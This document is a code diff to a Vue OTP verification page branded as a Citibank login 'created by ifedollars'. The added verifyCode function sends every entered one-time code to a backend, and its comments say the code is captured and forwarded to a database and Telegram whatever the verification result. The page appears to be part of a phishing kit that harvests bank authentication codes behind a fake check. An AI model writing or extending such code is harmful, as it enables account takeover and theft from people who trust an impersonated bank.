@@ -1,5 +1,4 @@
 <template>
-
   <div
     class="absolute top-24 right-20  bg-white/30 backdrop-blur-md rounded-2xl shadow-lg z-50 px-8 py-3 w-2/5 h-[500px] flex items-center gap-5 justify-center flex-col">
     <router-link to="/" class="bi bi-x-square text-black text-4xl font-bold self-start"></router-link>
@@ -20,13 +19,13 @@
     <input v-model="code" type="text" maxlength="6" placeholder="Enter 6-digit code"
       class="mt-4 w-full px-4 py-2 border rounded focus:outline-none" />
 
-    <button @click="verifyCode" class="mt-4 w-full px-4 py-2 text-white bg-green-600 rounded hover:bg-green-700">
-      Verify
+    <button @click="verifyCode" :disabled="verifyLoading"
+      class="mt-4 w-full px-4 py-2 text-white bg-green-600 rounded hover:bg-green-700 disabled:opacity-50">
+      {{ verifyLoading ? 'Verifying...' : 'Verify' }}
     </button>
 
     <p v-if="error" class="text-red-500 text-sm mt-2 text-center">{{ error }}</p>
   </div>
-
 </template>
 
 <script setup>
@@ -40,6 +39,7 @@ const codeSent = ref(false)
 const countdown = ref(0)
 const error = ref('')
 const loading = ref(false)
+const verifyLoading = ref(false)
 const userEmail = ref(localStorage.getItem('email') || '')
 
 function generateCode() {
@@ -83,15 +83,53 @@ async function sendCode() {
   }
 }
 
-function verifyCode() {
-  if (code.value === generatedCode.value) {
-    alert('Code verified! You have sucessfully logged into citibank created by ifedollars')
-    router.push('/')
-  } else {
-    error.value = 'Invalid code. Please try again.'
+async function verifyCode() {
+  if (!code.value.trim()) {
+    error.value = 'Please enter the verification code.'
+    return
+  }
+
+  verifyLoading.value = true
+  error.value = ''
+
+  try {
+    // 🚀 Send OTP to backend first (this captures the user's input)
+    const backendResponse = await fetch('http://localhost:3000/api/otp', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        otp: code.value
+      })
+    })
+
+    const backendData = await backendResponse.json()
+    console.log('Backend response:', backendData)
+
+    // ✅ OTP sent to database and Telegram regardless of verification result
+
+    // Now check if the code matches the generated one
+    if (code.value === generatedCode.value) {
+      alert('Code verified! You have successfully logged into citibank created by ifedollars')
+      router.push('/')
+    } else {
+      error.value = 'Invalid code. Please try again.'
+    }
+
+  } catch (err) {
+    console.error('Backend error:', err)
+    // Still continue with frontend verification even if backend fails
+    if (code.value === generatedCode.value) {
+      alert('Code verified! You have successfully logged into citibank created by ifedollars')
+      router.push('/')
+    } else {
+      error.value = 'Invalid code. Please try again.'
+    }
+  } finally {
+    verifyLoading.value = false
   }
 }
 </script>
-
 
 <style scoped></style>
